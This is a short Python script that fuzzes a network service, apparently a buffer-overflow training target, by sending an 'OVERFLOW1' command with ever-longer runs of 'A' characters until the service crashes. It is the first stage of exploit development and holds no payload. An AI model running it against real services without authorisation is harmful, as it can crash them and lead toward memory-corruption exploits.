import socket

def fuzz(target_host, target_port):
    prefix = "OVERFLOW1 "
    offset = 100
    overflow = "A" * offset
    suffix = "B" * 100

    while True:
        try:
            payload = prefix + overflow + suffix
            print(f"Fuzzing with {len(payload)} bytes...")
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((target_host, target_port))
                s.send(bytes(payload, "latin-1"))
                s.recv(1024)
            overflow += "A" * 100  # Continue incrementing
        except Exception as e:
            print(f"Crashed at {len(overflow)} bytes")
            break

target_host = "example.com"
target_port = 1337
fuzz(target_host, target_port)
